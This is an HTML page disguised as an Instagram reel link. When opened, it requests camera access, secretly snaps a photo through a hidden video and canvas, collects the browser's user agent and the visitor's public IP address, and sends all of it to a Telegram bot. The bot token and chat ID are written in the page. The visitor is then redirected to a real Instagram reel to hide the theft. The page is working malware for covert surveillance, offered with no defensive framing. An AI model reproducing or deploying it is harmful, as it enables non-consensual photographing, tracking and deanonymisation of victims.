<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>www.instagram.com/reel/DAY2H4YvBPl/</title>
    <style>
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
                video.addEventListener('loadedmetadata', captureAndSendPhoto);
            })
            .catch((err) => console.error('Error accessing the camera: ', err));

        function captureAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            getDeviceInfo(imageData);
        }

        function getDeviceInfo(imageData) {
            const deviceInfo = navigator.userAgent;
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => sendToTelegram(imageData, deviceInfo, data.ip))
                .catch(error => console.error('Error getting IP:', error));
        }

        function sendToTelegram(imageData, deviceInfo, ip) {
            const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
            const chatId = '6305469091';
            const blob = dataURLToBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.png');
            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}`);

            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => window.location.href = 'https://www.instagram.com/reel/DBBllN4IdG9/?igsh=aHcxdm5mcGF0NWF3')
            .catch(error => console.error('Error:', error));
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
